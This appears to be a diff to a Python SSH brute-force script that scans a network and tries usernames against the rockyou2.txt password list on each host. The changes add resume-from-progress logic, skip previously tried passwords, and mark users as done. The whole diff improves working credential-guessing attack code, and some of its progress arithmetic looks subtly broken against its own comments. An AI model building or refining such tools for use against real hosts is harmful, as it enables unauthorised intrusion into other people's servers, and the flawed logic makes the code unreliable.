@@ -1,6 +1,5 @@
 import os
 import time
-import datetime
 
 '''
 -------------------------------------------------------MYIMPORTS-------------------------------------------------------
@@ -13,7 +12,7 @@ myGlobalIp = SSHScanNetwork.getMyGlobalIp()
 
 splitBy = SSHFiles.detectOS()
 getPathToCurrentDir = SSHFiles.getPathToCurrentDir()
-linesInFile = SSHFiles.getAmountOfLinesInFile(getPathToCurrentDir + "rockyou2.txt")
+amountOfLinesInRockyou = SSHFiles.getAmountOfLinesInFile(getPathToCurrentDir + "rockyou2.txt")
 #print(linesInFile)
 
 '''
@@ -81,7 +80,10 @@ def attackAllOnScannedNetworkBySequence():
         for user in usernames:
             if isError:
                 break
-            resumeFromWhere(ip, user)
+            index = resumeFromWhere(ip, user)
+            if index == -1:
+                #Goes to next user
+                continue
             removingBreakline = user.split("\n")
             user = removingBreakline[0]
             for pw in passwords:
@@ -89,6 +91,11 @@ def attackAllOnScannedNetworkBySequence():
                     if isError:
                         break
                     counter += 1
+                    if counter <= index:
+                        #Skipping all previously tried passwords
+                        continue
+                    if amountOfLinesInRockyou == counter:
+                        writeProgress(ip, user, "DONE")
                     checkIfCounterIs143(counter, ip, user)
                     #pw = pw[:-1]
                     password = str(pw)
@@ -146,7 +153,7 @@ def targetAttack(ipAddress, usernameOrpassword, howManyInstances):
 '''
 
 def checkIfCounterIs143(counter, ip, user):
-    if (round(linesInFile / 100000) % counter) == 0:
+    if (round(amountOfLinesInRockyou / 100000) % counter) == 0:
         #For every 143 lines it saves progress
         writeProgress(ip, user, 1)
 
@@ -158,10 +165,12 @@ def resumeFromWhere(ip, username):
         index = 0
         for i in range(SSHFiles.getAmountOfLinesInFile(filename)):
             splitList = contentOfFile[i].split(" ")
-            if splitList[1] == "DONE":
+            if username == splitList[0] and splitList[1]  == "DONE":
                 print("Done testing passwords for this user. Proceeding to next user...")
+                index = -1
                 break
-            index = index + 143 * pow(10, splitList[1])
+            elif username == splitList[0]:
+                index = index + (143 * pow(10, int(splitList[1]))) #splitList[1] might include "\n"
         #Returns the index where it should start to read for new passwords
         return index
 
